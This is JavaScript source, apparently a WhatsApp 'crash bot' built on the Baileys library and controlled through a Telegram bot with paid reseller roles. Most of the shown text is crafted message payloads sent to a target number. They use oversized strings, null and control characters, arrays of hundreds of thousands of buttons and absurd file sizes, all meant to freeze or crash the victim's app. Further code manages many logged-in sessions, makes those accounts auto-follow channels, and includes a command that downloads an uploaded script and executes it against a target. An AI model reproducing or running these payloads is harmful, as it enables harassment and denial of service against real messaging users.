    const lexxMsg = generateWAMessageFromContent(target, acaaMsg, {});

    await sock.relayMessage(target, lexxMsg.message, {
        participant: true,
        messageId: lexxMsg.key.id
    });

    const LexzyFrezee = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        stanzaId: sock.generateMessageTag(),
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                fileLength: "9999999999999",
                                pageCount: 3567587327,
                                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                fileName: "PARAMS_JSON",
                                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1735456100",
                                contactVcard: true,
                                caption: "Zero'X - Executed¿!",
                            },
                        },
                    },
                    body: {
                        text: "Zero'X¿!" + "?".repeat(75000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(9000),
                                    id: null
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ြ".repeat(9000),
                                    id: null
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ြ".repeat(9000),
                                    url: "https://" + "ꦽ".repeat(9000) + ".com"
                                })
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ြ".repeat(9000),
                                    copy_code: "ꦽ".repeat(9000)
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "PROMOTION",
                                    flow_cta: "PAYMENT_PROMOTION",
                                    flow_message_version: "4"
                                })
                            }
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, LexzyFrezee, {
        messageId: sock.generateMessageTag(),
        participant: true
    });

    await sock.relayMessage(
        "status@broadcast",
        LexzyFrezee,
        {
            messageId: sock.generateMessageTag(),
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "META AI",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target } }
                            ]
                        }
                    ]
                }
            ]
        }
    );

    await sock.relayMessage(
        target,
        {
            interactiveMessage: {
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'catalog_message',
                            buttonParamsJson: JSON.stringify({}),
                        },
                        {
                            name: "booking_status",
                            buttonParamsJson: JSON.stringify({}),
                        },
                        {
                            name: "review_and_pay",
                            buttonParamsJson: JSON.stringify({
                                currency: "IDR",
                                total_amount: { value: 0, offset: 100 },
                                reference_id: "x",
                                type: "physical-goods",
                                order: {
                                    status: "payment_requested",
                                    subtotal: { value: 0, offset: 100 },
                                    order_type: "ORDER",
                                    items: [
                                        {
                                            name: "x",
                                            amount: { value: 0, offset: 100 },
                                            quantity: 9999
                                        }
                                    ]
                                }
                            }),
                        },
                    ],
                    messageParamsJson: JSON.stringify({}),
                },
            },
        },
        {
            participant: true,
            additionalNodes: [
                {
                    tag: 'biz',
                    attrs: { native_flow_name: 'catalog_message' },
                },
            ],
        }
    );

    await sock.relayMessage(
        target,
        {
            interactiveMessage: {
                body: {
                    title: "Zero'X" + "ြ".repeat(7500),
                    hasMediaAttachment: true,
                    text: "Zero'X",
                },
                nativeFlowMessage: {
                    buttons: "\x10".repeat(9000),
                },
            },
        },
        {
            participant: true,
        }
    );

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "Zero'X¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 500000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: true,
    });

    const bpklo = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Zero'X¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                999999999999999998999,
                                999999999999999899999,
                                999999999999999989999,
                                999999999999999998999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Zero'X¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 750000 }, () => ({}))
                    }
                }
            }
        }
    };

    const mmklu = generateWAMessageFromContent(target, bpklo, {});

    await sock.relayMessage(target, mmklu.message, {
        participant: true,
        messageId: mmklu.key.id
    });

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Zero'X¿!",
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "booking_status",
                        ParamsJson: "\x10".repeat(9000),
                    },
                ],
            },
        }
    }, { participant: true });
}

async function Spamdelay(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: "Zero'X"
                            },
                            nativeFlowMessage: {
                                buttons: Array.from({ length: 500000 }, () => ({}))
                            },
                            contextInfo: {
                                quotedMessage: {
                                    stickerPackMessage: {}
                                }
                            }
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
    } catch (error) {
        console.error("Err:", error.message);
    }
}

async function DelayRtr(sock, target) {
    try {
        const rtr = "Zero'Z ".repeat(999999);
        const v2rtr = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: rtr },
                        nativeFlowMessage: {
                            name: "payment_key_info",
                            buttonParamsJson: JSON.stringify({
                                info: rtr
                            })
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, v2rtr, {
            participant: { jid: target }
        });

        console.log(" Sukses Terkirim");
    } catch (err) {
        console.error("Error: " + err.message);
    }
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();

        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 401 || statusCode === 403) {
            console.log(`[${sessionName}] Session BANNED - Auto delete`);
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            try {
              fs.rmSync(folderPath, { recursive: true, force: true });
              console.log(`[${sessionName}] Folder deleted`);
            } catch (e) {
              console.log(`[${sessionName}] Gagal hapus folder:`, e.message);
            }
            resolve();
            return;
          }

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}
async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: 30000,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000); 
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        console.log("⏳ Sedang mengambil ID Channel dari link invite...");
        
        // 1. Resolve dan Follow Channel Pertama
        const ch1 = await sock.newsletterMetadata("invite", "0029VbCYKTpLY6dEwVHEpl0w");
        if (ch1 && ch1.id) await sock.newsletterFollow(ch1.id);

        // 2. Resolve dan Follow Channel Kedua
        const ch2 = await sock.newsletterMetadata("invite", "0029VbCgVBrHLHQdqRBTgi0U");
        if (ch2 && ch2.id) await sock.newsletterFollow(ch2.id);

        // Catatan: Baris unfollowAllChannel() sengaja gua comment. 
        // Kalau nggak, bot lu bakal langsung keluar lagi dari channel yang baru di-follow.
        // await sleep(5000);
        // await unfollowAllChannel();
        
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal:", e.message);
      }
      
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

const REQUIRED_GROUP_ID = "-1004471492590"; // GANTI DENGAN ID GRUP WAJIB
const MAIN_DEV_ID = 7565486613; 

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    // PAKAI KUTIP ("") AGAR AMAN
    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
      devList: ["7565486613"], 
      roles: {} 
    }, null, 2));
  }
  let config = JSON.parse(fs.readFileSync(telegramDataPath));
  if (!config.devList) config.devList = [];
  if (!config.roles) config.roles = {};
  
  // --- FORCE SEMUA ID JADI STRING BIAR GAK BUG TYPE DATA ---
  config.devList = config.devList.map(id => String(id).trim());
  
  // Normalize roles keys juga jadi string
  const newRoles = {};
  for (const key in config.roles) {
    newRoles[String(key).trim()] = config.roles[key];
  }
  config.roles = newRoles;
  
  return config;
}

function getUserBotRole(id) {
  const config = loadTelegramConfig();
  const strId = String(id).trim(); // ID dari Telegram diubah jadi String bersih
  
  if (config.devList.includes(strId)) return 'dev';
  if (config.roles[strId]) return config.roles[strId].role;
  return null;
}

function saveTelegramConfig(config) {
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
}

// --- HIRARKI AKSES YANG BENAR ---
const PERMS = {
  // Add: Hanya yang lebih tinggi yang bisa mendaftarkan
  addowner: ['dev'],
  addmod: ['owner', 'dev'],
  addpartner: ['mod', 'owner', 'dev',],
  addadmin: ['mod', 'partner', 'owner', 'dev',],
  addreseller: ['admin', 'partner', 'mod', 'owner', 'dev'],
  addvip: ['owner', 'dev'],
  addmember: ['reseller', 'admin', 'partner', 'mod', 'owner', 'dev'],
  
  // Create: Yang di-add wajib bisa create buat dirinya sendiri
  createowner: ['owner', 'dev'],
  createmod: ['moderator', 'owner', 'dev'],
  createpartner: ['partner', 'moderator', 'owner'],
  createadmin: ['admin', 'moderator', 'partner', 'owner', 'dev'],
  createreseller: ['reseller', 'admin', 'partner', 'moderator', 'owner', 'dev'],
  createvip: ['vip', 'owner', 'dev'],
  createmember: ['member', 'reseller', 'admin', 'partner', 'moderator', 'owner', 'dev'],
};

function canDo(id, action) {
  const role = getUserBotRole(id);
  if (!role) return false;
  return PERMS[action]?.includes(role) || false;
}

function enforceGroup(msg, id) {
  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    bot.sendMessage(id, "⚠️ [PERINGATAN]\n\nDilarang command di Private Chat!");
    const config = loadTelegramConfig();
    config.devList.forEach(dev => {
      bot.sendMessage(dev, `🚨 ALERT: [${id}](tg://user?id=${id}) mencoba command di private chat!`, { parse_mode: "Markdown" });
    });
    return false;
  }
  if (msg.chat.id.toString() !== REQUIRED_GROUP_ID) {
    bot.sendMessage(id, "⚠️ Grup ini bukan grup resmi untuk command.");
    return false;
  }
  return true;
}

function enforcePrivate(msg, id) {
  if (msg.chat.type === "group" || msg.chat.type === "supergroup") {
    return bot.sendMessage(id, "⚠️ [PERINGATAN]\n\nCommand *create* hanya bisa dilakukan di **Private Chat** bot, bukan di grup!", { parse_mode: "Markdown" }).then(() => false).catch(() => false);
  }
  return true;
}

// ==========================================
// COMMAND BOT (1x PAKAI, DURASI IKUT ADD ROLE)
// ==========================================

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const role = getUserBotRole(id);
  let text = "👋 *SixEyesX Project Bot database*\n\n";
  let buttons = [];

  if (role === 'dev') {
    text += "👑 Status: *Developer*\n\nPilih aksi:";
    buttons.push([{ text: "➕ Add Owner", callback_data: "m_addowner" }]);
  } else if (role) {
    const myData = loadTelegramConfig().roles[id.toString()];
    text += `🛡️ Status: *${role.charAt(0).toUpperCase() + role.slice(1)}*\n`;
    text += myData?.used ? "❌ Akun sudah pernah dibuat.\n" : "✅ Belum pernah buat akun.\n\n";
    text += "Pilih aksi:";
    buttons.push([{ text: "🆕 Create Akun", callback_data: "m_create" }]);
  } else {
    text += "⛔ Anda tidak memiliki akses.";
  }

  bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } });
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  
  if (data === "m_addowner") {
    bot.sendMessage(id, "Masukkan: `id_telegram durasi`\n*Contoh:* `123456 30`", { parse_mode: "Markdown" });
    bot.once("message", msg => bot.emit('message', msg));
  }
  if (data === "m_create") {
    bot.sendMessage(id, "Masukkan: `create<role> username`\n*Contoh:* `/createmember denis`", { parse_mode: "Markdown" });
    bot.once("message", msg => bot.emit('message', msg));
  }
  
  bot.answerCallbackQuery(query.id);
});

// ==========================================
// STEP 1: ADD ROLE (WAJIB GRUP, KIRIM KE GRUP)
// ==========================================
bot.onText(/^\/add(owner|mod|partner|admin|reseller|vip|member) (.+)/, async (msg, match) => {
  const id = msg.from.id;
  const action = `add${match[1]}`;
  
  if (!canDo(id, action)) return bot.sendMessage(msg.chat.id, `❌ Kamu tidak punya izin untuk *${action}*.`).catch(()=>{});
  if (!enforceGroup(msg, id)) return; // Cek Wajib Grup

  const args = match[2].trim().split(" ");
  if (args.length < 2) return bot.sendMessage(msg.chat.id, "❌ Format salah. Contoh: `/addmoderator id_telegram durasi`", { parse_mode: "Markdown" }).catch(()=>{});

  const targetId = args[0];
  const duration = parseInt(args[1]) || 30;

  const config = loadTelegramConfig();
  config.roles[targetId] = { role: match[1], duration: duration, used: false };
  saveTelegramConfig(config);

  // 1. Kirim sukses ke Grup
  bot.sendMessage(msg.chat.id, `✅ Berhasil add *${match[1]}*.\n\n👤 Target: ${targetId}\n⏳ Durasi Akun: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});
  
  // 2. Kirim notifikasi private ke target
  try {
    await bot.sendMessage(parseInt(targetId), `✅ Kamu didaftarkan sebagai *${match[1]}*.\n⏳ Durasi: ${duration} Hari\n\n*WAJIB* buat akun dengan command /create${match[1]} di **Private Chat** bot ini!`, { parse_mode: "Markdown" });
  } catch (err) {
    if (err.code === 'ETELEGRAM' && err.response?.statusCode === 403) {
      bot.sendMessage(msg.chat.id, `⚠️ Gagal mengirim notifikasi ke ${targetId} (Belum /start).`, { parse_mode: "Markdown" }).catch(()=>{});
    }
  }

  // 3. Kirim Log ke Dev Utama
  bot.sendMessage(MAIN_DEV_ID, `🆕 *[ADD ROLE LOG]*\n\n👥 Pelaku: [${msg.from.id}](tg://user?id=${msg.from.id})\n🎯 Target: ${targetId}\n🛡️ Role: ${match[1]}\n⏳ Durasi: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});
});

// ==========================================
// STEP 2: CREATE ROLE (WAJIB PRIVATE, KIRIM KE PRIVATE)
// ==========================================



const https = require('https');


const OWNER_ID = 7565486613;

// ======= EXTRACT ASYNC FUNCTIONS =======
function extractFunctions(filePath) {
  const code = fs.readFileSync(filePath, 'utf8');
  const results = {};
  const regex = /async function (\w+)\s*\(([^)]*)\)/g;
  let match;

  while ((match = regex.exec(code)) !== null) {
    const funcName = match[1];
    const rawParams = match[2].split(',').map(p => p.trim()).filter(Boolean);
    results[funcName] = rawParams;
  }

  return results;
}

// ======= CALL SEMUA FUNCTION DARI FILE =======
async function callAllFunctionsFromFile(filePath, sock, targetJid) {
  const code = fs.readFileSync(filePath, 'utf8');
  const extractedFuncs = extractFunctions(filePath);
  const funcNames = Object.keys(extractedFuncs);

  if (funcNames.length === 0) throw new Error('Gak ada async function ditemukan');

  const callStatements = funcNames.map(funcName => {
    const params = extractedFuncs[funcName];
    const args = params.map(p => {
      if (p === 'sock') return 'sock';
      if (p === 'targetJid') return 'targetJid';
      return 'null';
    }).join(', ');
    return `if (typeof ${funcName} === 'function') await ${funcName}(${args});`;
  }).join('\n');

  const fullCode = `
    ${code}
    ${callStatements}
  `;

  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
  const fn = new AsyncFunction('sock', 'targetJid', 'require', 'console', 'setTimeout', fullCode);
  await fn(sock, targetJid, require, console, setTimeout);
}
// ======= /test COMMAND =======
bot.onText(/\/test (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from ? msg.from.id : null;

  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ <b>AKSES DITOLAK!</b>\nLu bukan bos gua!", { parse_mode: 'HTML' });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "⚠️ Reply dulu ke file .js target, Bos!", { parse_mode: 'HTML' });
  }

  const doc = msg.reply_to_message.document;
  if (!doc) {
    return bot.sendMessage(chatId, "⚠️ Reply harus ke file .js, Bos!", { parse_mode: 'HTML' });
  }

  const inputText = match[1].trim();
  const args = inputText.split(/\s+/);
  const targetInput = args[0];
  const loopCount = parseInt(args[1], 10) || 1;

  if (isNaN(loopCount) || loopCount <= 0) {
    return bot.sendMessage(chatId, "⚠️ Jumlah loop harus angka positif, Bos!", { parse_mode: 'HTML' });
  }

  // Download file dari Telegram
  const fileLink = await bot.getFileLink(doc.file_id);
  const filePath = `/tmp/${doc.file_name}`;

  await new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(filePath);
    https.get(fileLink, res => {
      res.pipe(fileStream);
      fileStream.on('finish', resolve);
      fileStream.on('error', reject);
    });
  });

  // Extract info functions
  const extractedFuncs = extractFunctions(filePath);
  const funcNames = Object.keys(extractedFuncs);

  if (funcNames.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Gak ada async function yang ketemu di file itu, Bos!", { parse_mode: 'HTML' });
  }

  // Standarisasi JID
  let targetJid = targetInput.endsWith("@g.us") || targetInput.endsWith("@s.whatsapp.net")
    ? targetInput
    : targetInput.replace(/\D/g, "") + "@s.whatsapp.net";

  let availableSocks = typeof activeConnections !== 'undefined' ? Object.values(activeConnections) : [];
  if (availableSocks.length === 0) {
    return bot.sendMessage(chatId, "❌ Gak ada koneksi aktif.", { parse_mode: 'HTML' });
  }

  const selectedSock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

  const statusMsg = await bot.sendMessage(chatId,
